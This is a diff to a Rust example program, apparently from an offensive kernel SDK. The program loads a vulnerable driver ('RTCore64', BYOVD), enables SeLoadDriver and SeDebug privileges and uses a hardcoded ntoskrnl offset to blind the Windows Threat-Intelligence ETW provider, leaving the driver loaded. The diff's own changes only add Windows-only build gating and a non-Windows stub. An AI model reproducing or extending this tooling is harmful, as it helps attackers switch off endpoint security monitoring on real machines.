@@ -12,14 +12,19 @@
 //!        --target x86_64-pc-windows-msvc --example etw_ti_blind_test
 //! 运行: target\...\examples\etw_ti_blind_test.exe
 
-#![cfg(target_os = "windows")]
 
+
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::etwti::{EtwTiBlind, EtwTiOffsets};
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::win::{bootstrap_byovd, kernel_base};
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::EtwTiKit;
+#[cfg(target_os = "windows")]
 use nyx_operator_kernelsdk::KernelRw;
 
 // 与 bootstrap_test 一致：驱动放 system32\drivers，相对 ImagePath。
+#[cfg(target_os = "windows")]
 const SYS_PATH: &[u16] = &[
     'S' as u16,
     'y' as u16,
@@ -52,13 +57,16 @@ const SYS_PATH: &[u16] = &[
     's' as u16,
     0,
 ];
+#[cfg(target_os = "windows")]
 const SVC_NAME: &[u16] = &[
     'R' as u16, 'T' as u16, 'C' as u16, 'o' as u16, 'r' as u16, 'e' as u16, '6' as u16, '4' as u16,
 ];
 
 /// ntoskrnl!EtwThreatIntProvRegHandle RVA (build 17763.1339, PDB-resolved).
+#[cfg(target_os = "windows")]
 const ETW_TI_HANDLE_RVA: u32 = 0x40A6B0;
 
+#[cfg(target_os = "windows")]
 extern "system" {
     fn RtlAdjustPrivilege(
         privilege: u32,
@@ -68,6 +76,7 @@ extern "system" {
     ) -> i32;
 }
 
+#[cfg(target_os = "windows")]
 fn enable_privileges() {
     for (luid, name) in [(10u32, "SeLoadDriver"), (20u32, "SeDebug")] {
         let mut prev: i32 = 0;
@@ -76,6 +85,7 @@ fn enable_privileges() {
     }
 }
 
+#[cfg(target_os = "windows")]
 fn main() {
     println!("[etw_ti_blind_test] start pid={}", std::process::id());
     enable_privileges();
@@ -183,4 +193,24 @@ fn main() {
     println!("\n[etw_ti_blind_test] DONE — ETW-TI blinded. Driver kept loaded.");
     println!("    verify: logman query \"Microsoft-Windows-Threat-Intelligence\"");
     std::mem::forget(loaded);
+}
+
+
+// ----------------------------------------------------------------------------
+// Non-Windows entry-point fallback (E0601 mitigation).
+//
+// The real `fn main()` (and every Windows-only item above) is gated by
+// `#[cfg(target_os = "windows")]`. This file is compiled as an example crate,
+// which requires a `main` entry point; on macOS/Linux dev hosts the Windows
+// body compiles to nothing and the build would fail with E0601 ("main
+// function not found"). This stub exists solely to satisfy the crate root on
+// non-Windows so `cargo build --examples` / `cargo test` stay green. It is
+// mutually exclusive with the Windows `main` above and never runs on target.
+// ----------------------------------------------------------------------------
+#[cfg(not(target_os = "windows"))]
+fn main() {
+    eprintln!(
+        "{} is a Windows-only kernel example (BYOVD driver load). It has no          effect on non-Windows hosts.",
+        env!("CARGO_BIN_NAME")
+    );
 }
